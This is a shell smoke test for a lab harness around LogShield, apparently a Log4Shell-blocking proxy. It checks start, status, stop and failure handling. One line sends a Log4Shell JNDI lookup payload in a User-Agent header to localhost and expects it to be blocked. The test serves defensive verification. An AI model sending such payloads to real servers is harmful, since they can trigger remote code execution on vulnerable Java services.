#!/bin/sh
# Smoke test for lab/run.sh without a JDK: a fake `java` and the real logshield.
#
#   lab/test/run-smoke.sh [path-to-logshield-binary]
#
# Checks start, status, refusal to double-start, that traffic really flows
# through LogShield (benign passes, a Log4Shell payload is blocked), stop, and
# the failure path when a component cannot start. Uses ports 8000, 8080, 9001
# and 9100 on 127.0.0.1.
set -eu

ROOT=$(cd "$(dirname "$0")/../.." && pwd)
LS="${1:-}"
WORK=$(mktemp -d)
trap 'sh "$WORK/run.sh" stop >/dev/null 2>&1 || true; rm -rf "$WORK"' EXIT

if [ -z "$LS" ]; then
	(cd "$ROOT" && CGO_ENABLED=0 go build -o "$WORK/logshield-bin" ./cmd/logshield)
	LS="$WORK/logshield-bin"
fi

mkdir -p "$WORK/jdk/bin" "$WORK/bin"
cp "$ROOT/lab/run.sh" "$WORK/run.sh"
cp "$ROOT/lab/test/fake-java.py" "$WORK/jdk/bin/java"
cp "$LS" "$WORK/bin/logshield"
chmod +x "$WORK/run.sh" "$WORK/jdk/bin/java" "$WORK/bin/logshield"
cd "$WORK"

fail() { echo "smoke: FAIL: $*" >&2; exit 1; }

echo "smoke: start"
./run.sh start >start.out 2>&1 || { cat start.out >&2; fail "start"; }

echo "smoke: status"
./run.sh status >status.out
for n in listener canary-hook logshield; do
	grep -q "^$n: running" status.out || fail "$n not running"
done
grep -q '^canary-real: stopped' status.out || fail "canary-real should be stopped"

echo "smoke: double start is refused"
if ./run.sh start >/dev/null 2>&1; then fail "second start succeeded"; fi

echo "smoke: traffic flows through LogShield"
code=$(curl -s -o /dev/null -w '%{http_code}' -m 5 http://127.0.0.1:8000/hello)
[ "$code" = 200 ] || fail "benign request got $code"
# shellcheck disable=SC2016 # the payload must reach the proxy literally
code=$(curl -s -o /dev/null -w '%{http_code}' -m 5 -g -H 'User-Agent: ${jndi:ldap://example.invalid/a}' http://127.0.0.1:8000/)
[ "$code" = 403 ] || fail "attack got $code, want 403"

echo "smoke: stop"
./run.sh stop >/dev/null
./run.sh status | grep -q running && fail "something is still running after stop"

echo "smoke: failure path reports the failing component and exits non-zero"
if FAKE_JAVA_FAIL=1 ./run.sh start >fail.out 2>&1; then fail "start succeeded with a broken JDK"; fi
grep -q 'listener failed to start' fail.out || fail "missing failure message"
grep -q 'iptables' fail.out || fail "missing firewall hint"
./run.sh status | grep -q running && fail "failed start left processes behind"

echo "smoke: PASS"
